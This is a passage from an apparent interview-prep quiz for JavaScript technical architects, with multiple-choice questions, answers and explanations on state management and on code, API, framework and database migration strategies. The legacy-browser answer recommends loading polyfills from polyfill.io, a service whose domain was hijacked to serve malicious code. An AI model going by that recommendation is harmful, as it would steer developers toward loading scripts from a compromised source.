
<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect handle undo/redo functionality in a state management system?

- A) Undo/redo requires a completely custom state management solution
- B) Use the memento pattern: maintain a history stack of past states; undo replaces current state with the previous snapshot; redo replays; limit history length to control memory
- C) Store all state changes in `localStorage` and replay them for undo
- D) Undo functionality should only be added after all other features are complete

**Answer: B) Memento pattern — history stack of past states; undo/redo pop/push from stacks; limit history length**

**Explanation:** Undo/redo state shape: `{ past: [state1, state2], present: currentState, future: [state4] }`. On action: push `present` to `past`, set new `present`, clear `future`. On undo: pop from `past`, push `present` to `future`, set popped state as `present`. `redux-undo` implements this for Redux. Optimizations: 1) Limit `past` length (keep last 50 states). 2) For large state, store diffs/patches rather than full snapshots. 3) Some actions (navigation, network requests) may be excluded from the undo stack.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct approach to atomic state updates in Jotai for dependent derived state?

```javascript
const userAtom = atom(null);
const permissionsAtom = atom((get) => {
  const user = get(userAtom);
  return user ? computePermissions(user.role) : [];
});
const canEditAtom = atom((get) => get(permissionsAtom).includes('edit'));
```

- A) Derived atoms cause infinite re-computation loops
- B) Derived atoms (read-only atoms that `get` other atoms) automatically re-compute only when their dependencies change — no extra memoization needed
- C) Derived state should always be computed in components, never in atoms
- D) Jotai atoms cannot be composed hierarchically

**Answer: B) Derived atoms automatically re-compute only when dependencies change — built-in memoization**

**Explanation:** Jotai\'s derived atoms are fundamentally lazy and memoized: `permissionsAtom` recomputes only when `userAtom` changes. `canEditAtom` recomputes only when `permissionsAtom` changes. Components subscribed to `canEditAtom` only re-render when the boolean changes — not on every `userAtom` update. This is the atomic state model (Recoil/Jotai) vs. the monolithic store model (Redux). Atoms enable fine-grained subscriptions: components only re-render when their specific atoms change, reducing unnecessary renders at scale.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect handle optimistic updates with rollback in a complex state?

```javascript
const updateUserMutation = useMutation({
  mutationFn: updateUser,
  onMutate: async (newUser) => {
    await queryClient.cancelQueries({ queryKey: ['user', newUser.id] });
    const previousUser = queryClient.getQueryData(['user', newUser.id]);
    queryClient.setQueryData(['user', newUser.id], newUser); // optimistic
    return { previousUser }; // snapshot for rollback
  },
  onError: (err, newUser, context) => {
    queryClient.setQueryData(['user', newUser.id], context.previousUser); // rollback
  },
  onSettled: () => queryClient.invalidateQueries({ queryKey: ['user'] }),
});
```

- A) Optimistic updates should never be used — rollback is too complex
- B) Cancel in-flight queries → optimistically update cache → snapshot for rollback → rollback on error → invalidate on settle; this pattern provides instant UI feedback with reliable error recovery
- C) Only invalidate the query after the mutation — optimistic update is unnecessary
- D) Rollback should reload the entire page to ensure consistency

**Answer: B) Cancel in-flight → optimistic update → snapshot → rollback on error → invalidate on settle**

**Explanation:** TanStack Query optimistic update lifecycle: 1) **Cancel in-flight queries** — prevent race conditions with stale refetch overwriting the optimistic update. 2) **Snapshot previous state** — returned from `onMutate` as context. 3) **Apply optimistic update** — UI immediately shows the change. 4) **`onError`** — if mutation fails, restore the snapshot (rollback). 5) **`onSettled`** — always runs; invalidates to get the definitive server state. This pattern is the industry standard for optimistic UI.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 37. Migration & Evolution

<br>

## Q. A Technical Architect is planning a migration of a 500K-line JavaScript codebase to TypeScript. Which migration strategy minimizes risk and allows incremental adoption?

- A) Rewrite all 500K lines in TypeScript before shipping anything — ensures full type safety from the start
- B) Rename all `.js` files to `.ts` at once with `"strict": true` — forces the team to fix all type errors immediately
- C) Enable `"allowJs": true` and `"checkJs": true` in `tsconfig.json`, add TypeScript incrementally starting with shared utilities and critical modules, and use `// @ts-check` in JS files as a transitional step
- D) Use a third-party type generator tool to auto-annotate all functions — manual type annotations are unnecessary

**Answer: C) Enable `"allowJs": true` and `"checkJs": true` in `tsconfig.json`, add TypeScript incrementally starting with shared utilities and critical modules, and use `// @ts-check` in JS files as a transitional step**

**Explanation:** A "big bang" rewrite of a large codebase stalls feature development for months and carries enormous risk. The safe strategy is incremental migration: `allowJs` lets TypeScript files coexist with JavaScript; `checkJs` enables type checking in JS files without renaming them. Prioritize shared utilities (highest leverage), then domain modules, then UI components. Set `"strict": false` initially, tighten strictness module-by-module. This approach lets teams ship features while progressively improving type safety.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Technical Architect must define an API versioning strategy for a public-facing JavaScript SDK consumed by hundreds of external clients. Which strategy best balances backward compatibility and evolution?

```javascript
// Current SDK public API
import { fetchUser } from "@company/sdk"; // v1

// Proposed new signature (breaking change)
// v1: fetchUser(id: string) → Promise<User>
// v2: fetchUser(id: string, options?: FetchOptions) → Promise<User>
```

- A) Release a new npm package name for every breaking change — forces clients to opt in explicitly
- B) Use semantic versioning (SemVer): non-breaking additions increment the minor version; breaking changes increment the major version, with a documented migration guide and deprecation period
- C) Maintain all API versions indefinitely in one package — never remove old method signatures
- D) Use URL-based versioning in the SDK — clients specify `/v2/` in the import path

**Answer: B) Use semantic versioning (SemVer): non-breaking additions increment the minor version; breaking changes increment the major version, with a documented migration guide and deprecation period**

**Explanation:** SemVer (`MAJOR.MINOR.PATCH`) is the standard contract for JavaScript package evolution. Adding an optional `options` parameter is non-breaking (minor bump). Removing or changing a required parameter is breaking (major bump). Architects should: (1) communicate breaking changes in a changelog, (2) provide a `v2` migration guide, (3) maintain the previous major version with security patches for a defined period, and (4) use `@deprecated` JSDoc annotations to warn consumers in their IDEs before removal.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the Strangler Fig pattern and how does it apply to frontend migration?

- A) The Strangler Fig pattern refers to removing unused CSS from a codebase
- B) The Strangler Fig pattern incrementally replaces a legacy system by routing new functionality to the new system while legacy code handles the rest — the new system gradually "strangles" the old one until the old system is retired
- C) The Strangler Fig pattern requires rewriting the entire application at once
- D) The Strangler Fig pattern only applies to backend microservices, not frontend applications

**Answer: B) Incrementally replace legacy functionality while routing new code to the new system — the old system is eventually retired**

**Explanation:** Frontend application: a routing proxy (nginx, CDN path-based routing, or client-side route guard) directs `/new-feature` to the new React app and `/legacy-feature` to the old jQuery app. Teams migrate feature-by-feature. The old system handles unchanged pages; the new system grows. When all routes are migrated, the legacy system is decommissioned. Key benefit: continuous delivery throughout the migration (no months-long freeze). Tools: Module Federation enables this within the same deployment.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct strategy for migrating from a class-based React codebase to hooks?

- A) Rewrite all class components to function components simultaneously
- B) Migrate incrementally: wrap legacy class components in Higher-Order Components or render props where needed, convert leaf components first (no children), then container components, and use `React.forwardRef` where needed
- C) Class components are broken in React 18 and must be migrated immediately
- D) Add hooks directly to class components — they can coexist

**Answer: B) Migrate incrementally — leaf components first, then containers; HOC/render props bridge the gap during transition**

**Explanation:** Hooks cannot be used inside class components — they are function component only. Safe migration: 1) **Leaf components** — no children, no complex lifecycle — convert first (lowest risk). 2) **Custom hooks** — extract reusable logic into hooks; class components can consume them via HOC wrapper. 3) **Container components** — convert after leaf dependencies are done. 4) `React.forwardRef` when the function component needs ref forwarding. 5) `componentDidCatch` → Error Boundary class components are the exception: React has no hook for error boundaries yet.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect manage a framework migration (Angular → React) for a large production application?

- A) Rewrite everything in React in a development branch and deploy all at once
- B) Use the Strangler Fig pattern: new features are built in React, existing Angular code is maintained; a shared header/shell embeds both frameworks; migrate modules incrementally over 12-24 months
- C) Framework migrations cannot be done incrementally — a full rewrite is the only option
- D) Migrate the entire application in one 2-week sprint

**Answer: B) Strangler Fig with shared shell embedding both frameworks; new features in React; migrate modules incrementally**

**Explanation:** Running two frameworks in one app: 1) **Shared shell** — a thin HTML/CSS layer hosts both. 2) **Module Federation or Custom Elements** bridge Angular and React components. 3) **Shared services** — authentication, routing, i18n — extracted to framework-agnostic utilities. 4) **Feature flags** — enable new React modules for internal testers first. 5) **Parallel running** — A/B test new React module vs old Angular module in production. Timeline: typically 12-24 months for large apps. Teams maintain velocity throughout vs. 6+ months of feature freeze for big bang rewrites.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct strategy for deprecating and removing a public REST API consumed by JavaScript clients?

- A) Remove the endpoint when the new version is ready — clients will update quickly
- B) Announce deprecation timeline, add `Deprecation` and `Sunset` HTTP headers, maintain the deprecated version for a defined sunset period (6-12 months), provide migration guides, and monitor usage to ensure clients have migrated before removal
- C) Breaking API changes can be released without notice
- D) Maintain all API versions permanently — never sunset old endpoints

**Answer: B) Deprecation headers + sunset period + migration guides + usage monitoring before removal**

**Explanation:** RFC 8594 defines `Sunset: Wed, 01 Jan 2025 00:00:00 GMT` and `Deprecation: Wed, 01 Jul 2024 00:00:00 GMT` HTTP headers — browsers and SDK clients can parse and warn. Deprecation lifecycle: 1) Announce (email, docs, changelog). 2) Add headers (clients start seeing warnings). 3) Monitor usage via API gateway metrics — know who is still calling deprecated endpoints. 4) Contact high-traffic users directly. 5) Remove after sunset date and traffic drops to near-zero. Never remove until traffic confirms clients have migrated.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right approach to codemods for large-scale automated code transformations?

- A) Manual find-and-replace is always more reliable than automated codemods
- B) Write codemods using `jscodeshift` (AST transformation) for syntactic changes; test on a small subset first; run in CI to verify no regressions; codemods can automate 80-90% of migration work
- C) Codemods only work for TypeScript — not plain JavaScript
- D) Regular expressions in a shell script are the preferred approach for code transformation

**Answer: B) `jscodeshift` AST codemods for syntactic changes; test subset first; CI verification; automates 80-90% of migration**

**Explanation:** `jscodeshift` transforms code via AST (Abstract Syntax Tree) manipulation — much safer than regex (understands code structure, not just text). Use cases: renaming APIs across thousands of files (`fetchUser` → `getUser`), migrating from one import style to another, updating prop names in React components. React\'s own migration tools (`react-codemod`) are `jscodeshift` codemods. Workflow: 1) Write and test codemod on small sample. 2) Run on full codebase. 3) Manually review edge cases. 4) PR with automated changes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect ensure database schema migrations are safe in a zero-downtime deployment?

- A) Stop the server, run all migrations, then restart — the simplest approach
- B) Use backwards-compatible migrations: add new columns as nullable → deploy new code that writes to both old and new columns → backfill data → make column required → remove old column in a later release
- C) Schema migrations and application deployments should always be deployed together
- D) Database rollbacks automatically handle failed migrations

**Answer: B) Expand-contract pattern: add nullable → dual writes → backfill → tighten → remove old column in future release**

**Explanation:** Zero-downtime migration (expand-contract): **Phase 1 (Expand)**: Add `new_column` as `NULL` — old code writes to `old_column`; new code reads both. **Phase 2 (Migrate)**: Deploy code that writes to both columns; backfill existing rows. **Phase 3 (Contract)**: Once all rows have `new_column` populated, make it `NOT NULL`; remove reads from `old_column`. **Phase 4 (Cleanup)**: Remove `old_column` after the old code is fully removed. This ensures the database is compatible with both old and new application code simultaneously during rolling deployments.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct approach to managing a monolith-to-micro-frontend migration?

- A) Identify all modules, split them all into separate repositories simultaneously
- B) Extract the highest-value, most independently-changing modules first; establish the shared infrastructure (shell, auth, design system) before any MFE extraction; use feature flags to gradually route traffic to new MFEs
- C) Monolith-to-MFE migration requires stopping all feature development
- D) All teams must complete their MFE extraction simultaneously for the system to work

**Answer: B) Extract high-value independent modules first; establish shared infrastructure first; feature flags for gradual traffic routing**

**Explanation:** Migration sequence: 1) **Shared infrastructure** — shell application, authentication, design system, CI/CD templates. Getting this wrong is expensive to fix later. 2) **Pilot MFE** — extract one module (e.g., user profile) that has a small team and well-defined boundaries. Learn from it. 3) **Gradual extraction** — prioritize by team independence and deployment frequency needs. 4) **Feature flags** — route 5% of users to the new MFE; validate; increase to 100%. 5) **Decommission** monolith modules as traffic is fully migrated. Total timeline: 18-36 months for large monoliths.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect handle legacy browser support while adopting modern JavaScript?

- A) Support IE11 forever — removing support alienates users
- B) Define a browser support policy based on analytics data; use Babel with targeted `@babel/preset-env` and `browserslist` config; polyfill selectively; ship modern ES modules to modern browsers and legacy bundles to old ones (differential serving)
- C) Always target the lowest common denominator — write ES5 everywhere
- D) Modern JavaScript cannot be transpiled to work in older browsers

**Answer: B) Analytics-driven browser policy; targeted Babel transpilation; differential serving (modern ESM + legacy fallback)**

**Explanation:** Differential serving: 1) **Check analytics** — if < 0.5% of users are on IE11, drop support. 2) **`browserslist`** config drives Babel and PostCSS targeting. 3) **Module/nomodule pattern**: `<script type="module" src="modern.js">` loaded by modern browsers; `<script nomodule src="legacy.js">` loaded by old browsers. Modern bundle = smaller (less transpilation, no polyfills). 4) **Selective polyfilling** — polyfill.io serves only the polyfills each browser needs. This avoids shipping unnecessary code to 95% of users for 5% browser compatibility.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is a Technical Architect\'s strategy for managing a design system migration?

- A) Replace all old components with new design system components in a single release
- B) Run old and new design systems in parallel using a compatibility layer; migrate page-by-page using feature flags; establish a migration timeline and deprecation of old components with a clear sunset date
- C) Design system migrations only affect developers — no user impact
- D) New design systems should be fully adopted before being made available to any teams

**Answer: B) Parallel systems with compatibility layer; page-by-page migration with feature flags; deprecated component sunset**

**Explanation:** Design system migration: 1) **Compatibility layer** — new components accept old props (forwards compatibility). 2) **Parallel running** — both v1 and v2 components available; teams migrate at their own pace. 3) **Component audit** — track migration progress per component per team. 4) **Feature flags** — enable new design system page-by-page; visual regression tests on each page. 5) **Sunset schedule** — "v1 components removed in 6 months" forces migration completion. 6) **Codemods** for mechanical prop renames. The biggest risk is visual regression — automated screenshot comparison is essential.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>
